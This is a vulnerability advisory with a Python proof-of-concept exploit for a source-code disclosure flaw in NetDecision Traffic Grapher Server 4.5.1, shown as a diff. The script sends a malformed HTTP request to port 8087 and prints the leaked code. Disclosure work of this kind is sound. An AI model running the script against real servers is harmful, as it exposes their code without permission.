@@ -1,0 +1,161 @@
+##############################################################################
+#
+# Title    : Netmechanica NetDecision Traffic Grapher Server Information 
+#            Disclosure Vulnerability
+# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://www.netmechanica.com
+# Advisory : http://secpod.org/blog/?p=481
+#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_Vuln.txt
+#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_PoC.py
+# Software : Netmechanica NetDecision Traffic Grapher Server version 4.5.1
+# Date     : 06/12/2011
+#
+###############################################################################
+
+SecPod ID: 1039     				05/12/2011 Issue Discovered
+						21/02/2012 Vendor Notified
+						22/02/2012 Vendor Acknowledge
+						24/02/2012 Issue Resolved
+
+
+Class: Information Disclosure			Severity: High
+
+
+Overview:
+---------
+Netmechanica NetDecision Traffic Grapher Server version 4.5.1 is prone to
+source code information disclosure vulnerability.
+
+
+Technical Description:
+----------------------
+The vulnerability is caused due to improper validation of malicious HTTP 
+GET request to Traffic Grapher Server 'default.nd' with invalid HTTP version 
+number followed by multiple 'CRLF', which discloses the source code of 
+'default.nd'
+
+
+Impact:
+--------
+Successful exploitation could allow an attacker to cause disclosure of
+sensitive information.
+
+
+Affected Software:
+------------------
+NetDecision 4.5.1 (full package) Traffic Grapher Server version 4.5.1
+
+
+Tested on:
+-----------
+NetDecision 4.5.1 (full package) Traffic Grapher Server version 4.5.1
+on Windows XP SP3 & Win XP2. 
+Older versions might be affected.
+
+
+References:
+-----------
+http://secpod.org/blog/?p=481
+http://www.netmechanica.com/downloads
+http://www.netmechanica.com/news/?news_id=26
+
+
+Proof of Concept:
+----------------
+http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_PoC.py
+
+
+Vendor URL:
+----------------
+http://www.netmechanica.com
+http://www.netmechanica.com/news/?news_id=26
+
+
+Solution:
+----------
+Upgrade to NetDecision 4.6.1
+
+
+Risk Factor:
+-------------
+    CVSS Score Report:
+        ACCESS_VECTOR          = NETWORK
+        ACCESS_COMPLEXITY      = LOW
+        AUTHENTICATION         = NOT_REQUIRED
+        CONFIDENTIALITY_IMPACT = COMPLETE
+        INTEGRITY_IMPACT       = NONE
+        AVAILABILITY_IMPACT    = NONE
+        EXPLOITABILITY         = PROOF_OF_CONCEPT
+        REMEDIATION_LEVEL      = UNAVAILABLE
+        REPORT_CONFIDENCE      = CONFIRMED
+        CVSS Base Score        = 8 (AV:N/AC:L/Au:N/C:C/I:N/A:N)
+        Risk factor            = High
+
+
+Credits:
+--------
+Prabhu S Angadi of SecPod Technologies has been credited with the discovery of this
+vulnerability.
+
+
+#!/usr/bin/python
+##############################################################################
+#
+# Title    : Netmechanica NetDecision Traffic Grapher Server Information 
+#            Disclosure  Vulnerability
+# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://www.netmechanica.com
+# Advisory : http://secpod.org/blog/?p=481
+#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_Vuln.txt
+#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_PoC.py
+# Software : Netmechanica NetDecision Traffic Grapher Server version 4.5.1
+# Date     : 06/12/2011
+#
+###############################################################################
+
+import socket,sys,time
+
+
+if len(sys.argv) < 2:
+        print "\t[-] Usage: python SecPod_Exploit_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc.py target_ip"
+        print "\t[-] Example : python SecPod_Exploit_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc.py 127.0.0.1"
+        print "\t[-] Exiting..."
+        sys.exit(0)
+
+port   = 8087
+target = sys.argv[1]
+
+try:
+    socket.inet_aton(target)
+except socket.error:
+    print "Invalid IP address found ..."
+    sys.exit(1)
+
+try:
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    sock.connect((target,port))
+    time.sleep(1)
+except:
+    print "socket() failed"
+    sys.exit(1)
+
+exploit = "GET " + "/test.nd" + " HTTP/-1111111"+"\r\n\r\n"
+
+print "HTTP GET request for /default.nd with invalid HTTP version triggers"+\
+       " the vulnerability"
+
+data = exploit
+sock.sendto(data, (target, port))
+
+for i in range(1,10):
+    sock.sendto("\r\n",(target, port))
+    time.sleep(1)
+
+time.sleep(10)
+res = sock.recv(10000)
+sock.close()
+print "[+] Source Code of Netdecision Traffice Grapher Server : \r\n"
+print res
+sys.exit(1)
+
+
